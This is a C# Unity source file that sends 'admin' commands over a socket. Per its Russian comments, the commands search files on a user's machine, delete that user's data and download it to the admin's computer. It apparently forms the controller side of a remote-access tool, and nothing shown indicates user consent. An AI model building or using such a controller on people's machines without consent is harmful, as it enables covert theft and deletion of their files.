using HiroNetwork;
using UnityEngine;
using Assets.Scripts.BinartFile;
using System.Collections.Generic;
using HiroNetwork.IO;
using System.IO;
using Assets.Cryptography;

enum ClientPackets
{
    СFoundFiles = 1,
    CErrorsMessages = 2,
    CRegistrationAdmin = 3,
    CAdminSearchData = 4,
    CAdminDeleteData = 5,
    СAdminSaveData = 6,
}

internal class NetworkSend : MonoBehaviour
{

    public static NetworkSend network_send;

    public void Start()
    {
        network_send = this;
    }


    // Авторизация админа
    public void RegistrationAdmin(string secret_token)
    {
        ByteBuffer buffer = new ByteBuffer(4);
        buffer.WriteInt32((int)ClientPackets.CRegistrationAdmin);

        buffer.WriteString(CryptographyData.instance.Encrypt(secret_token));

        NetworkConfig.socket.SendData(buffer.Data, buffer.Head);
        buffer.Dispose();
    }

    // Поиск файлов у пользователя
    public void AdminSearchData(int user_file_search_id, string name_directory, string pattern)
    {
        ByteBuffer buffer = new ByteBuffer(4);
        buffer.WriteInt32((int)ClientPackets.CAdminSearchData);

        buffer.WriteInt32(user_file_search_id);

        buffer.WriteString(CryptographyData.instance.Encrypt(name_directory));
        buffer.WriteString(pattern);

        NetworkConfig.socket.SendData(buffer.Data, buffer.Head);
        buffer.Dispose();
    }

    // Удаление данных у какого-то пользователя
    public void AdminDeleteData(int user_file_search_id, string name_directory_file)
    {
        ByteBuffer buffer = new ByteBuffer(4);
        buffer.WriteInt32((int)ClientPackets.CAdminDeleteData);

        buffer.WriteInt32(user_file_search_id);
        buffer.WriteString(CryptographyData.instance.Encrypt(name_directory_file));

        NetworkConfig.socket.SendData(buffer.Data, buffer.Head);
        buffer.Dispose();
    }

    // Скачать данные у пользователя у себя на компьютер
    public void AdminDownloadData(int user_file_search_id, string name_directory_file)
    {
        ByteBuffer buffer = new ByteBuffer(4);
        buffer.WriteInt32((int)ClientPackets.СAdminSaveData);

        buffer.WriteInt32(user_file_search_id);
        buffer.WriteString(CryptographyData.instance.Encrypt(name_directory_file));

        NetworkConfig.socket.SendData(buffer.Data, buffer.Head);
        buffer.Dispose();
    }
}

